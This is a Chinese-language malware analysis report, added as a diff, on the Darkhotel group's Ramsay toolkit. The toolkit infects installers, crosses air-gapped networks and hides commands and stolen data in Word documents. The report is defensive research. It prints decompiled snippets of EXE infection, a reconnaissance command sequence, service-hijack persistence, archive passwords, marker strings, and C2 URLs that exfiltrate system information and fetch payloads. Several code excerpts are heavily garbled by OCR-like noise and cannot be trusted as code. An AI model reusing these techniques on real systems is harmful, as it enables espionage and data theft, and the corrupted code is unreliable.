@@ -1,0 +1,436 @@
+# Darkhotel组织渗透隔离网络的Ramsay组件分析  
+
+原创安天CERT安天4天前  
+
+## 1.概述  
+
+安天CERT于2020年4月20日发现APT组织Darkhotel在近期的威胁行为，并持续跟进分析，现公布本次渗透隔离网络的Ramsay组件以及与Darkhotel组织关联分析报告。  
+
+Darkhotel组织是具有国家背景的一般能力国家/地区行为体，又名Dubnium、Nemim、Tapaoux、APT-C-06、T-APT-02等，由Kaspersky于2014年11月首次披露，是一个活跃至今、主要目标国家为中国、朝鲜、印度、日本的攻击组织。在以往的攻击活动中使用劫持WiFi投递诱饵、鱼叉式钓鱼邮件、Oday、nday、滥用数字签名、白利用，以及感染U盘文件达到突破物理隔离等技术手段。  
+
+在这次事件中，Darkhotel组织的策略是将恶意代码与合法应用捆绑，以往对该组织的披露认为这种捆绑策略是为了伪装恶意代码，即属于ATT&CK初始投递载荷阶段。但实际上，从近期捕获的样本Ramsay组件来看，与合法应用捆绑的恶意代码属于被感染的文件而非伪装的诱饵，属于ATT&CK内网横移渗透阶段，主要用于在隔离网络传播恶意代码。判定此次Darkhotel渗透活动属于隔离网络有以下四方面原因：  
+
+·第一，假设目标终端部署杀软，则文件感染的方式很容易被检出，但根据活跃样本的狩猎情况并未发现更多的样本，说明Darkhotel活动限于特定的目标;  
+
+·第二，办公场景的应用安装包多数来自于共享盘下载或者同事之间的信任分享，尤其在隔离网络场景，无法去应用官网下载；  
+
+·第三，早期有关Darkhotel的披露中，如果缺少组件则会通过Powershell下载，但是本次Darkhotel活动的分析中并未涉及网络请求或者下载行为;  
+
+·第四，本次Darkhotel活动不是基于网络协议的C2，而是基于自定义的文件传输控制指令，当Ramsay扫描到被带入隔离网络环境的感染文档，则读取对应的指令并执行指令对应的载荷对象作为攻击利器在隔离网络传播。  
+
+通过关联分析捕获到了Darkhotel初始投递阶段的载荷，一镜之中，窥以全豹。  
+
+  
+图1-1Darkhotel组织Ramsay组件渗透活动对应的ATT&CK映射图谱  
+
+行动中涉及10个阶段28个技术点，具体技术行为描述如下表  
+
+<html><body><table><tr><td>ATT&CK阶段/类别</td><td>具体行为</td></tr><tr><td>初始访问</td><td>通过感染可移动介质传播自身或者疑似使用鱼叉式钓鱼邮件传播</td></tr><tr><td>执行</td><td>通过诱导用户执行，以及利用windows服务、加载模块API执行</td></tr><tr><td>持久化</td><td>通过新建服务、利用ApplnitDLL（注册表项）、利用计划任务</td></tr><tr><td>提权</td><td>绕过用户账户控制（UAC）</td></tr><tr><td>防御规避</td><td>进程注入、软件加壳、DLL搜索顺序劫持、删除文件</td></tr><tr><td>发现</td><td>发现文件和目录、发现网络共享、发现进程</td></tr><tr><td>横向移动</td><td>拷贝远程文件、利用远程服务、通过可移动介质复制</td></tr><tr><td>收集</td><td>自动收集、收集本地系统数据、收集网络共享驱动数据、收集可移动介质数据、获取屏幕截图</td></tr><tr><td>命令与控制</td><td>通过可移动介质通信、使用自定义C2协议</td></tr><tr><td>渗出</td><td>压缩数据</td></tr></table></body></html>  
+
+### 2.1被感染软件的分析  
+
+被感染软件的时间戳为2020年3月4日，在外观上看似伪装成知名压缩软件7Zip的安装包，考虑到木马的PE感染机制，这例诱饵很可能是某个受害者网络中被Ramsayv2感染的正常7Zip安装包，并不是最初的诱饵。  
+
+  
+图2-1被感染软件图标  
+
+Ramsayv2木马释放原理如下:  
+
+Installer结构负责找到诱饵自身的4个特殊标志的位置，将包含的正常7Zip运行器、Dropper和正常7Zip安装包提取出来，释放到临时目录并运行：  
+
+  
+图2-2安装包诱饵结构图示  
+
+正常7Zip运行器负责运行正常的7Zip安装包，在前台弹出交互界面。  
+
+  
+图2-3弹出正常7Zip安装界面  
+
+Dropper负责释放后续的一系列功能组件:  
+
+Dropper运行后需先检查是否要创建"%APPDATA%\Microsoft\\UserSetting\\"目录，再检查自身命令参数是否为"gQ9VOe5m8zP6"，是则开始释放多个功能组件。Dropper释放的方式与7Zip诱饵有所不同，且更直接：从Dropper自身的指定偏移开始，读取指定大小字节，再将前两字节改回MZ头，最后写入指定位置。  
+
+包含的各组件罗列如下，根据系统环境选择释放：  
+
+表2-1各功能组件  
+
+
+<html><body><table><tr><td>释放路径</td><td>大小</td><td>主要功能</td></tr><tr><td>%TEMP%\I%S2.exe</td><td>104960字节</td><td>开源工具UACME，用于BypassUAC</td></tr><tr><td>%System32%\\ldentitieslwide</td><td>595968字节</td><td>Dropper自身复制而来</td></tr><tr><td>shut.exe</td><td></td><td></td></tr><tr><td>%System32%\\ldentities\lshar</td><td>562064字节</td><td>WinRAR官方主程序</td></tr><tr><td>p.exe</td><td></td><td></td></tr><tr><td>%System32%\\/dentities\\bind</td><td>299082字节</td><td>感染本地和内网共享中的EXE，突破网络隔离</td></tr><tr><td>svc.exe</td><td></td><td></td></tr><tr><td>%system32%\ldrivers\\hfile.sy</td><td>65280字节</td><td>内核Rootkit</td></tr><tr><td>S</td><td></td><td></td></tr><tr><td>%system32%\\msfte.dll (64位)</td><td>221184字节</td><td>窃密丨打包丨CVE-2017-0147漏洞扫描丨基于</td></tr><tr><td></td><td></td><td>件传输的C2通讯</td></tr><tr><td>%system32%\\msfte.dll(32位)</td><td>190464字节</td><td>同上</td></tr></table></body></html>  
+
+<html><body><table><tr><td>%system32%\loci.dll（64位）</td><td>221184字节</td><td>窃密|打包 |CVE-2017-0147漏洞扫描丨基于文 件传输的C2通讯</td></tr><tr><td>%system32%\loci.dll（32位）</td><td>190464字节</td><td>同上</td></tr><tr><td>%system32%\1wimsvc.exe</td><td>595968字节</td><td>Dropper自身复制而来</td></tr></table></body></html>  
+
+# 以下例举核心功能组件：  
+
+" bindsvc.exe"组件  
+
+该组件负责感染非系统盘和内网网络共享中的EXE程序，等待攻击目标携带传播进入隔离网络。感染结果跟上文中7Zip诱饵的文件结构一致，只是末尾的正常软件换成每次的感染对象。具体过程详见第3章。  
+
+### "msfte.dll"组件  
+
+该组件区分32位和64位。攻击者将其内部命名为：“Ramsay"。  
+
+运行方式："msfte.dl"在 system32目录下能劫持系统服务"WSearch"，被系统程序"SearchSystemHost.exe"以SYSTEM权限调用运行。  
+
+主要功能按导出函数分为DlEntryPoint()，AccessDebugTracer(和AccessRetailTracer() :  
+
+#### 2.1.1 导出函数：DllEntryPoint()  
+
+1.获取本机硬件GUID。  
+
+2.释放脚本"%APPDATA%\\Microsoft\\Word\\winword.vbs"，从用户近期的Word文档中提取纯文本。  
+
+V65 $=$ &FileName;   
+kk_cryptData_2trnmg_sdb(L"Collect Recent DoC - %s", &FileName);   
+PathName $=8$   
+memset(&v69, 0, 0x206u);   
+V65 $=$ (WCHAR \*)&Data;   
+wsprintfW(&PathName, L"%s\\Microsoft\VWord", &Data);   
+if ( PathFileExistsW(&PathName) Il CreateDirectoryW(&PathName, 0) ) $\begin{array}{r l}{\mathrm{V}^{2}}&{{}=}\end{array}$ PathFindFileNameW(&FileName); PathAppendW(&PathName, $\Psi_{i}^{2}$ ) if （CopyFileW(&FileName，&PathName，0）)// 复制word实体： //%APPDATA\Microsoftoffiecent\\*.docx.Ink --> // %APPDATA%\\Microsoft\VWord\\ kk_vbs_doc2txt(); //Word文档转化成txt ++v80;  
+
+V64=&v72 kk_cryptData_2trnmg_sdb(L"Collect TXT by converting word - %s", &v72); @天 FindClose(hFindFile);  
+
+### 3.窃取用户近期文件：  
+
+释放官方WinRAR程序，将用户近期文件的快捷方式加密打包：  
+
+%APPDATA%\\Microsoft\\Windows\\Recent\\\*.Ink（近期用户访问过的文件的快捷方式)打包密码为：PleaseTakeOut6031416!!@@##  
+
+4.检查自身是否处于进程"HYON.exe"或"BON.exe"或"Cover.exe"中，对应为何软件尚未确定。攻击者还为"msfte.dll"组件起了内部名称：“Ramsay"，内部版本为v8。  
+
+v5 = _wgetenv(L"SystemDrive");   
+if （ !strstrIw(&First, $\mathbb{V}5$ 1 //当前进程模块不在系统盘 StrStrIW(&First, L"HYON.exe") //当前进程名为HYON.exe StrStrIW(&First, L"BoN.exe") //当前进程名为BON.exe StrStrIW(&First, L"Cover.exe") ) //当前进程名为cover.exe v6 = GetCurrentProcessId(); kk_cryptData_2ramdisk_sdb( 安天 $\stackrel{!}{=}=\stackrel{-}{=}\stackrel{-}{=}\stackrel{-}{=}$ Injected Ramsay Dll v%d (PID: %d, Path: %s) \*(_DW0RD \*)v8_dword_1002B004, //版本号为8 V6, &First);  
+
+5.基于自定义的文件传输控制指令，参见第3章。  
+
+#### 2.1.2 导出函数：AccessDebugTracer()和AccessRetailTracer()  
+
+1.向explorer.exe进程注入自身。  
+
+2.将自身版本号写入"%APPDATA%\\Microsoft\\UserSetting\\version.ini"，此次版本为8。3.采集系统信息，包括系统版本、进程列表、网络连接、网络配置、路由信息、ARP表、调用msfte.dll的进程、网络分享、Pin"server"主机的结果（正常时不存在）、调用了hfile.sys的系统服务。这些信息会经加密，保存至"%APPDATA%\\Microsoft\\UserSetting\\MediaCache\\"目录下的.rtt文件。  
+
+memset(&CommandLine, 0, $\theta\times2\theta\sum\theta\times2$   
+wsprintfw(&CommandLine, L"/c systeminfo");   
+sub_1000cA60(&CommandLine, pszl, a2):   
+memset(&CommandLine, 0, 0x208u);   
+wsprintfw(&CommandLine, L"/c \"tasklist /v\"");   
+sub_100ocA60(&CommandLine, pszl, a2):   
+memset(&CommandLine, 0, 0x208u);   
+wsprintfW(&CommandLine, L"/c \"netstat -ano\"");   
+sub_1000cA60(&CommandLine, pszl, a2);   
+memset(&CommandLine, 0, 0x208u);   
+wsprintfw(&CommandLine, L"/c \"ipconfig /all\""); sub_1000cA60(&CommandLine, pszl, a2);   
+memset(&commandLine, 0, 0x208u);   
+wsprintfw(&CommandLine, L"/c \"route print\"");   
+sub_1000cA60(&CommandLine, pszl, a2);   
+memset(&CommandLine, 0, 0x208u);   
+wsprintfw(&CommandLine, L"/c \"arp -a\"");   
+sub_1000cA60(&CommandLine, pszl, a2);   
+memset(&commandinLine, Ox20autaskIist   
+sub_1000cA60(&commandLine, pszl, 821 ANTIY   
+memset(&CommandLine, 0, 0x208u);   
+wsprintfw(&CommandLine, L"/c \"net share\"");   
+sub_1000cA60(&CommandLine, pszl, a2):   
+memset(&CommandLine, 0, 0x208u);   
+wsprintfw(&CommandLine, L"/c \"ping server\"");   
+sub_1000cA60(&commandLine, pszl, a2);   
+memset(&commandLine, 0, 0x208u);   
+wsprintfw(&CommandLine, L"/c \"sc query hfile.sys\""); return sub_1000CA60(&CommandLine, pszl, a2): 4.搜集lE浏览器网络缓存目录中后缀名为".txt"、".doc"和".xls"的文档文件:   
+" %USERPROFIL $\mathtt{E\%}$ \\AppData\\Loca\Microsoft\\Windows\\Temporary Internet Files\\Content.lE5\\"   
+5.收集各磁盘信息，包括目录和文件列表、磁盘名、总空间、剩余空间。   
+枚举A到Z，采集当前已有磁盘的信息。   
+创建名为"lua"的窗口，设置lpfnWndProc函数，实现当有外部的可移动存储设备接入时 采集其信息：   
+Wndclass .lpszMenuName $=\boxed{e};$   
+WndClass.lpfnwndProc $=$ kk_RemovableDevices_spy;   
+Wndclass.lpszClassName $=$ L"lua";   
+Wndclass.hInstance $=$ hInstance;   
+if ( RegisterClassW(&Wndclass) ) hWnd $=$ CreateWindowExw( 0, WndClass.lpszClassName, 0, 0, 2147483648, 2147483648, $\textcircled{0}$ 安天 2147483648, ANTIY 2147483648, 0 0, hInstance, 0);   
+if ( a2 == 0x8000 ) // DBT_DEVICEARRIVAL   
+f if （\*（_DWORD \*)（a3 + 4）== 2) lstrcpyw(&stringl, L"A:"); String1 $=$ (char）sub_10008FA0（\*（_DWORD \*)（a3+12)）://确定盘符 kk_cryptData_2ramdisk_sdb(L"Drive %s Media has_arrived", &string1); result $=$ sub_10008BA0(&String1, 1, 0); //采集目录和文件列表，磁盘信息   
+else if ( $=2=[5\times8[5154]$ // DBT_DEVICEREMOVECOMPLETE   
+f result $=$ a3 安天 if （\*(_DWORD \*)(a3 + 4) == 2 ) $\downarrow\downarrow4$ sub_10008FA0（\*（_DWORD\*)（a3+12)）：//确定盘符 result $=$ kk_cryptData_2ramdisk_sdb(L"Drive %c: Media was removed.", $\mathbb{V}\dot{\mathbb{4}}$  
+
+6.内网CVE-2017-0147漏洞扫描：  
+
+CVE-2017-0147为著名的永恒系列中的WindowsSMB信息泄漏漏洞，这里攻击者通过向内网中Microsoft 服务器的消息块 1.0（SMBv1)发送特殊数据包，仅检查其是否存在该漏洞，并不利用：  
+
+  
+图2-7采集外部可移动存储设备的信息  
+
+  
+图2-8发送漏扫数据包判断是否可利用  
+
+7．内网共享目录扫描：  
+
+信息搜集：采集内网网络分享的子目录和文件列表、磁盘名、总空间、剩余空间。  
+文件搜集：搜集网络分享目录中后缀名为".txt"、".doc"和".xls"的文档文件。  
+
+8.加载"%SystemRoot%\\System32\\ldentities\\"目录下名为"netmgr_%d.dll"的DLL，%d取1到9。该DLL由攻击者传入的隐藏数据释放（参见第3章Ramsay基于文件传输的通讯方式），目前未获得实体：  
+
+wsprintfW(&pszPath, L"%s\\netmgr_%d.dll", v2, v1);// %SystemRoot%\ISystem32\\Identities\\netmgr_%d.dll   
+if ( PathFileExistsW(&pszPath))   
+{ v7 = LoadLibraryW(&pszPath); kk_cryptData_2ramdisk_sdb(L"LoadAutoRunDll - %s", &pszPath); if （!v7） 安天 kk_cryptData_2ramdisk_sdb(L"Failed to load the dll: %s", "LoadAutoRunDllThread", 779, &pszPath);   
+Sleep(1000u);  
+
+### 2.2漏洞利用文档分析  
+
+漏洞利用文档通过鱼叉式钓鱼邮件进入目标内部网络，先后通过漏洞CVE-2017-0199和CVE-2017-8570投放VBS脚本，添加注册表项建立持久机制。攻击者将PE文件隐写在图片中，通过VBS脚本加载运行，利用开源工具绕过UAC，作用主要是收集受害者的系统信息和外部可移动存储设备的信息。  
+
+此次的Ramsayv1样本没有感染正常文件的功能，但有实现基于自定义的文件传输控制指令和渗出能力。整体看来，这例攻击文档的主要目的是为了对目标的网络环境进行侦察探测。  
+
+文档诱饵"accept.docx"的正文为空白，最后保存时间为2019年5月2日，早于感染的软件诱饵。  
+
+元数据包含韩语"刘号”，中文含义是"标题"：  
+
+  
+图2-10诱饵文档的元数据包含韩语  
+
+文档利用了CVE-2017-0199漏洞，触发后会打开包含的CVE-2017-8570漏洞利用文档"afchunk.rtf"。  
+
+"afchunk.rtf"执行释放的SCT脚本OfficeTemporary.sct。OfficeTemporary.sct 负责释放和执行VBS脚本%ALLUSERSPROFILE%\sImgr.vbs。  
+
+slmgr.vbs首先将自身添加进注册表的Run启动项，实现开机启动：  
+
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run\slmgr %ALLUSERSPROFILE%\sImgr.vbs  
+
+然后提取文档包含的图片文件"image1.jpeg"。找到图片数据中的特殊标志，解码后续隐写的PE数据，释放到%ALLUSERSPROFILE%目录下随机命名的.eXe并运行。  
+
+  
+图2-11图片附加的特殊标志和PE数据  
+
+完整流程如下:  
+
+  
+
+释放的随机名.exe经深入分析，是属于上文中软件诱饵释放的Dropper的早期版本。  
+
+彼此间有诸多重要的功能代码重合，例如：  
+
+）运行后先检查自身参数是否为"gQ9VOe5m8zP6"。运行一组CMD命令，采集系统信息。收集本地和外部可移动存储设备的信息。加载攻击者投递的"netmgr_%d.dll"，%d取1到9。窃取近期用户文件的快捷方式。释放开源脚本，从用户近期Word文档中提取纯文本。  
+·使用开源UACME组件BypassUAC。  
+·基于文件传输的命令控制，指令和功能都相同。  
+
+此次Dropper具有的不同点如下：  
+
+具有更少的功能组件：  
+
+表2-2各功能组件  
+
+
+<html><body><table><tr><td>释放路径</td><td>大小</td><td>主要功能</td></tr><tr><td>%PROGRAMDATA%\identitiesnet</td><td>990208字节</td><td>Dropper自身复制而来</td></tr><tr><td>wiz.exe</td><td></td><td></td></tr><tr><td>%WINDIR%\syswow64\dpnom.dl</td><td>71168字节</td><td>向.doc文档写入隐藏数据</td></tr><tr><td>%PROGRAMDATA%\sharp.exe</td><td>562064字节</td><td>WinRAR官方主程序</td></tr></table></body></html>  
+
+?每隔30秒截取一次屏幕  
+·当有外部可移动存储设备接入时，除了采集信息，还会截取此刻的屏幕。RAR打包的密码为PleaseTakeOut!@#  
+·基于自定义的文件传输控制指令，参见第3章。  
+
+## 3.1突破隔离网络猜想  
+
+攻击者突破目标隔离网络的猜想是基于恶意代码功能的威胁行为，而非恶意代码时序空间的关联。Darkhotel活动限于特定的目标，在作业活动中依据Ramsayv1木马收集的USB数据信息发现目标存在隔离网络，由于基于网络协议的C2无法抵达隔离网络，而不得不制定隔离网络感染方案。  
+
+另一方面，鉴于隔离网络通过可移动设备带出的普通文档文件是不涉密的，因此，攻击者选择尽可能扫描感染隔离网络内部的所有文档，在这过程中，存在将密级文档内容摘要附加在感染的普通文档的情景，大大提高了重要情报被移动设备带出的可能性。同时，攻击者将Ramsay v2木马保留在隔离网络继续扫描文档，一旦发现文档带入隔离网络环境，则读取对应的指令并执行指令对应的载荷对象。  
+
+### 基于自定义的文件传输控制指令完整过程：  
+
+攻击者当前位置可能是位于目标内网，能控制一定数量的机器和共享目录上的文件。步骤1．感染正常的EXE文件，通过受害者携带进入隔离网络的机器中执行。步骤2.被攻陷的隔离网络机器中的窃密数据，被附加到正常Word文档的末尾；  
+
+(1)附加窃密数据的Word文档被受害者携带撤出隔离网络；  
+(2)攻击者找到这些Word文档，读取附加的窃密数据;  
+
+步骤3.攻击者感染新的Word文档，附加命令和执行对象。  
+
+(1)Word文档被受害者携带进入隔离网络;  
+(2)附加的命令和执行对象在隔离网络中已被攻陷的机器中得到执行；  
+(3)执行结果的日志随着步骤2也被带出隔离网络。  
+
+  
+图3-1突破隔离网络猜想流程图  
+
+攻击者突破隔离网络的手段，是通过感染本地非系统盘和内网共享目录中的EXE文件（特别是可移动存储设备中），形成跟7Zip软件诱饵结构相同的新诱饵，然后寄希望于攻击目标通过移动存储设备携带进入对外隔离的网络环境中得到运行。  
+
+.f （ ReadFile(hFile，&Buffer， 0x32u， &NumberOfBytesRead，0) )// 读取该EXE CloseHandle(hFile);   
+v18 = kk_findPartPosition((int)&Buffer, 50, 0, PESig5_byte_429E1C, 0x1Bu, 0); if (v18 ) kk_cryptData_2trnmg_sdb(L"[-] Already changed:%s"，&pszPath);// 包含PESig5，则已被修改过 if ( a2 ) ++dword_429D9C; else ++dword_429DA0; 1 else //没被修改过 v18 = kk_findPartPosition((int)&Buffer, 50, 0, PESig4_byte_429E00, 0x18u, 0); if (v18) f kk_cryptData_2trnmg_sdb( $\lfloor\underline{{\imath}}^{\mathrm{m}}\left[\left[+\right]\right]$ Needed NewBinding：%s"，&pszPath);// 需要新捆绑 IpAdres $=$ 行文天 kk_cryptData_2trnmg_sdb(L"> Success to Merge!");// 捆绑成功 if ( a2 ) ++\*(_DWORD \*)dword_429D94; else ++\*(_DwORD \*)dword_429D98; 1 else kk_cryptData_2trnmg_sdb(L"> Fail to Merge!");// 捆绑失败  
+
+感染完成的结构模板如下图所示，文件结尾的特殊标志"9J7uQTqgTxhqHaGUue5caaEr3KU"是为了标记完成，避免重复感染。  
+
+  
+图3-3感染完成的结构模板  
+
+通讯方式：基于文件传输控制指令  
+
+攻击者选择通过办公文件传输数据，突破网络隔离。我们猜测这可能是根据攻击目标频繁携带文档文件进出隔离网络的办公习性。  
+
+通讯的具体实现可分为2019年版本和2020年版本，以2019年版本为例：  
+
+·指令和执行对象的传入：  
+
+攻击者可在隔离网络的外部，感染受害者主机中的.doc和.docx文档，在尾部附加指令和数据形成下图中的结构。等待攻击目标携带抵达隔离网络中的已感染机器，附加的数据将被Ramsay组件读取并得到执行。  
+
+  
+图3-4指令数据附加结构  
+
+基于自定义的文件传输控制指令如下表：  
+
+#### 表3-1可接收的指令和功能  
+
+<html><body><table><tr><td>指令</td><td>功能</td></tr><tr><td>Rr*e#R79m3QNU3Sy</td><td>读取执行对象，向TEMP目录释放exe并运行。</td></tr><tr><td>CNDkS_&pgaU#7Yg9</td><td>读取执行对象，向%ALLUSERSPROFILE%\\Identities\\目录释放netmgr_%d.dll并加</td></tr><tr><td></td><td>载。</td></tr><tr><td>2DWcdSgcv3?(XYqT</td><td>读取执行对象，运行CMD命令。</td></tr></table></body></html>  
+
+指令完成后，附加数据被删除，感染文档得到还原。  
+
+·窃密数据渗出:  
+
+#### 该阶段进行于隔离网络的已感染机器中，步骤如下：  
+
+步骤1：搜寻本地的.doc和.docx文档，要求其创建时间或最后访问时间在1个月以内。步骤2：RAR加密打包集中存放着窃密数据的文件夹，密码为PleaseTakeOut!@#步骤3：对RAR压缩包再经一轮自定义加密。步骤4：向.doc或.docx文档的末尾附加数据，包括Magic标志、本机硬件GUID和加密的打包数据。由于同一个文档文件可能被多次感染，因此尾部也可能有多个附加组合。  
+
+#  
+
+  
+图3-5窃密数据附加结构  
+
+步骤5（猜测）：等待受害者携带这批附加着数据的文档渗出隔离网络，抵达已被攻击者攻陷的主机或共享目录。  
+
+步骤6（猜测）：攻击者根据固定的Magic值，定时在攻陷的受害者主机或共享目录中搜寻文件，找到这批文档，取出尾部附加的受害主机GUID和窃密数据，完成渗出。  
+
+## 4.样本关联与组织归属分析  
+
+### 4.1 样本关联  
+
+根据"accept.docx"包含的"afchunk.rtf"攻击文档的元数据和漏洞利用特征，能关联出另一例"afchunk.rtf":  
+
+  
+
+图 4-1 已知"accept.docx"包含的afchunk.rtf  
+
+  
+图4-2新关联出的afchunk.rtf  
+
+新关联出的"afchunk.rtf"的母体来自RAR压缩包"技術協.rar"，整体执行流程如下:  
+
+  
+图4-3关联样本的完整执行流程  
+
+  
+图4-4获取进程列表并返回给C2  
+
+再向系统启动目录下释放"svupdate32.exe"和"msrvc32.exe"。  
+
+"msrvc32.exe"负责收集系统信息，包括系统的版本、架构、地区、语言和注册者，并构造URL将这些信息发送回C2：  
+
+http://win-api-essentials[.]com/package/v2.php?im $=$ 000C29A414B2&fg $=$ u&inf $=$ Base64编码的系统信息  
+
+再构造URL，下载文件到"%LOCALAPPDATA%\Local\VirtuaIStore\"目录下的随机命名文件：http://win-api-essentials[.]com/package/v2.php?im $=$ 000C29A414B28&fg=d备用C2: http://service.email-126[.]net/box/open.php?se $=$ 000C29A414B2&fg=d最后根据C2返回数据中包含的指令和文件名，对随机命名的文件进行下一步操作：  
+
+#### 表4-1可接收的指令和功能  
+
+<html><body><table><tr><td>指令</td><td>功能</td></tr><tr><td>tta</td><td>将随机命名的文件，重命名为给定的字符</td></tr><tr><td>ttx</td><td>将随机命名的文件，重命名为：给定的字符+.exe，休眠5秒后将其运行</td></tr><tr><td>ttt</td><td>将随机命名的文件，移动到临时目录下的给定字符作文件名的文件</td></tr><tr><td>ttw</td><td>将随机命名的文件，移动到“%LOCALAPPDATA%\Roaming\Microsoft\Word\STARTUP”目录</td></tr><tr><td></td><td>下，文件名换为：给定的字符+.wll，以此实现在Word程序启动时将其调用运行</td></tr><tr><td>其他</td><td>将随机命名的文件，重命名为：给定的字符+.exe+其他</td></tr></table></body></html>  
+
+与Samsay活动，以及DarkHotel历史木马的关联：  
+
+经过对比，"svupdate32.exe"组件与本次Ramsay活动的木马，以及2019年1月被腾讯御见曝光【1】过的DarkHote组织基于DropBox的木马程序：eea409befee23eb475e4161f06d529a，三者彼此都存在独特代码的共享：  
+
+if ( $\sqrt{5},5=\sqrt{5}$ $v{\bar{\theta}}{\bar{\mathbf{5}}}={\bar{\theta}}{\mathbf{i}}$ $\begin{array}{r l}{\mathrm{~\boldmath~v~}{\boldsymbol{\Sigma}}}&{{}=}\end{array}$ (void \*\*\*)sub_401280(&v76, L"\\"); LOBYTE(v102) = 5; $\downarrow\perp=^{*}\downarrow\downarrow$ if (v9 ) $\smash{\psi_{\perp}\in\mathsf{\Gamma}}=\beta_{\parallel}\in\mathsf{\Gamma}$ else $\begin{array}{r l r}{\mathrm{~\boldmath~v~}\mathrm{~\boldmath~\Gamma~}}&{{}}\end{array}=}&{\hat{\bf g}_{s}\mathrm{~\boldmath~\cdot~}$ $\Delta75~=~(\mathrm{int}~^{-*})8\sqrt{8}5;$ $\begin{array}{r l}{\mathbb{V}\mathrm{\mathcal{I}}4}\end{array}=\mathbb{V}\mathbb{1}\mathbb{A}_{\mathrm{j}}^{*}$ $\begin{array}{r l r}{\sqrt{\lambda}}&{{}=}&{\mathsf{P}\mathsf{P}\mathbf{V}\mathbf{j}}\end{array}$ $\downarrow\pm1\pm$ stcal\*)(PVD,vid\*,int\*)(\*(PpV, v, &v); $\begin{array}{r}{\vee\mathbb{1}\mathbb{2}=\vee\mathbb{1}\mathbb{1};}\end{array}$ sub_401330(&v76); if $\{\mathrm{~\boldmath~v~l~a~}\}=\emptyset$ $\downarrow\downarrow\downarrow=$ (void \*\*\*)sub_401280(&v76, L"MSrvcSecureUpdate"); LOBYTE $\left(\mathrm{\vee162}\right)=\mathrm{\sf5}_{\mathrm{i}}$  
+
+if ( $\nu^{2}4\quad\mathtt{s}=\mathrm{~}\bar{\Theta}$ 1 V25 = (_DWoRD \*\*)sub_401280(L"Trigger1"); LOBYTE(v102)= 7; $\psi_{z}\in\ast_{\mathbb{V},2,5}$ $\smash{\psi_{i}^{2}7}=\smash{\vee_{i}2\bar{6}}$ \*v26:0 $\downarrow75=(\mathrm{int}^{-})\downarrow77;$ $\begin{array}{r}{\psi\vec{\imath}4=\psi\tilde{\delta}7.}\end{array}$ (\*(void (stdcal1 \*\*)(void \*，int))(\*(_DwoRD \*)v87 + 36))(v87，v27); LOBYTE(V102)=0; sub_401330(&v76); V28 $=$ (_DW0RD \*)sub_401280(L"2005-01-01T12:05 :00"); LOBYTE(v102) = 8; $\psi_{s}\Game=\left|^{\ast}\right|_{\psi}\Hat{2}\Hat{0}$ \*（_DWORD \*)\*v28：0; $\begin{array}{r l r}{\bigtriangledown5}&{{}=}&{(\mathtt{i n t}^{*}*)\bigtriangledown\bigtriangledown3}\end{array}$ $\sqrt{34}=\sqrt{67}$ V30 $=$ (\*(int（stdcall $\neq\neq$ )(void \*，int))(\*(_DwoRD \*)v87 + 60))(v87，v29); LOBYTE(v102) = 0; $\vee\exists\underline{{\cdot}}1=\vee\exists\bar{\Theta}.$ $\nu\bar{\lambda}1\ \ {\bar{\lambda}}\end{array}$ 安天 ANTIY $\downarrow5=\ell$ $\psi75~=~(\mathrm{int}~^{\ast})8\vee5!$ $\sqrt{74}=\sqrt{67}$ $\vee\ I=$ (\*(int (_stdcall \*\*)(void \*，void $\nRightarrow\nRightarrow$ ))（\*(_DWORD \*)v87 +40))(v87, v75=（int \*）v87; (\*(void(stdcall \*\*)(void $^{\ast})$ )(\*(_DWORD \*)v87 +8))(v87); if （v32 >=0) V33 = (_DWORD \*\*)sub_401280(L"PT3M"); LOBYTE(v102) = 9;  
+
+  
+图4-5"svupdate32.exe"的共享代码  
+
+  
+图4-8三者间存在的共享  
+
+### 4.2组织关联  
+
+经过深入代码比对，我们发现了Ramsay与Darkhotel组织的诸多关联：  
+
+#### 1.算法重叠  
+
+Ramsay在数据落地前使用的自定义加密算法逻辑，同奇安信之前披露过【2】的，Darkhotel组织多次用过的算法一致：  
+
+  
+amsay的算法样例  
+
+  
+图4-9 R  
+
+以及两种算法的组合选择，其中的第二种与曾经披露过的仅多了个加法步骤：  
+
+  
+
+  
+图4-12奇安信披露的算法  
+
+#### 2.功能和技术重叠：  
+
+Ramsay与Darkhotel的历史木马存在许多功能和技术重叠，例如：  
+·劫持系统的WSearch服务，实现持久化，获得SYSTEM权限。  
+·使用WinRAR加密打包窃取的文件。  
+·创建名为"ua"的窗口，实现文件窃取功能。  
+·通过一组CMD命令收集当前系统信息，这组命令大部分重合且顺序相同。  
+
+#### 3.特殊标志头重叠：  
+
+根据"bindsvc.exe"组件用于定位数据位置的标志头：  
+
+if ( ::lpAddress ) wsprintfA(PESig1_byte_429DAC,"%s%s","4znZCTTa2J24","E64GzUxaUnYg");// PE标志头1 wsprintfA(PEsig2_byte_429Dc8,"%s%s", "2A2rRhArF6ak", "s9PaRZBwdrbn"):// PE标志头2 WsprintfA(PESig3_byte_429DE4, "%s%s", "pN64RaafaQfj", "WXjM3Ku3UkqR% $\Psi7$ )//PE标志头3 wsprintfA(PESig4_byte_429E00,"%s%s","9J7uQTqgTxhq","HaGUue5caaEr");// PE标志头4 wsprintfA(PESig5_byte_429E1C，"%s%s%s"，"9J7uQTqgTxhq","HaGUue5caaEr","3KU");// PE标志头5 能够关联出2019年6月的样本，此时这3个标志头依然是用作定位数据的位置：  
+
+else   
+f v25 = 0i64; ${\mathsf{V}}{\equiv}1={\mathsf{\Omega}}\bar{\Theta};$ v25 = (char \*)sub_180002550(\*(char $\nRightarrow\nRightarrow$ )&v17[4], \*(int \*)v17,"S9PaRzBwdrbn"); if (!v25 ) return 0i64; Val $=$ lstrlenA(&string $^+$ 1024 \* (unsigned _int64)v7); memmove( $,\pm25+12$ &Val,2ui64); $\forall27=\forall25+14_{\:}$ memmove(v25 + 14, &string $+$ 1024 \* (unsigned _int64)v7, (unsigned int)Val); memset(&v25[Val $^+$ 14],0,1ui64); V25 $=$ (char \*)sub_180002550(\*(char \*\*)&v17[4],\*(int \*)v17,"2A2rRhArF6ak"); if (!v25 ) return 0i64; Val $=$ lstrlenA(::Src); memset(v25 $^+$ 12,Val, 1ui64); memmove(v25 $^+$ 13,::Src, (unsigned int)val); memset(&v25[Val $^+$ 13],0,1ui64); $=$ return 0i64; $\mathrm{\DeltaV}_{\perp}]~=~\mathrm{\{16:\Omega}}$ memset(v25 + 12, 16, 1ui64); memmove(v25 $^+$ 13, &Src, (unsigned int)val); memset(&v25[Val $^+$ 13],0, 1ui64); if（\*（_QWORD \*)&v17[4]） sub_180005780(\*(char \*\*)&v17[4], \*(unsigned int \*)v17);   
